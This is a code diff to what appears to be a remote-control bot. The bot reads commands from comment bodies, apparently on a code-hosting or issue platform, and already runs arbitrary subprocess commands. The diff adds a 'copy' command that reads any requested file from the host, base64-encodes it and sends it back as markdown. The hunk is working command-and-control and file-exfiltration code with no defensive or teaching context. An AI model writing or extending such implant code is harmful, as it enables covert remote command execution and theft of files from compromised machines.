@@ -59,6 +59,17 @@ class Bot:
                             stdout=subprocess.PIPE,
                         )
                         data = u.encode_data_to_markdown(u.encode_data_to_base64(result.stdout))
+                    elif command == cmd.COMMAND_COPY["command"]:
+                        path = self.get_command_argument(comment["body"])
+                        if not os.path.isfile(path):
+                            data = u.encode_data_to_markdown(
+                                u.encode_data_to_base64("File not found".encode(encoding="UTF-8"))
+                            )
+                        else:
+                            file_handler = open(path, "rb")
+                            data = file_handler.read()
+                            file_handler.close()
+                            data = u.encode_data_to_markdown(u.encode_data_to_base64(data))
                     elif command == cmd.COMMAND_RUN["command"]:
                         arguments_str = self.get_command_argument(comment["body"])
                         arguments = arguments_str.split(" ")
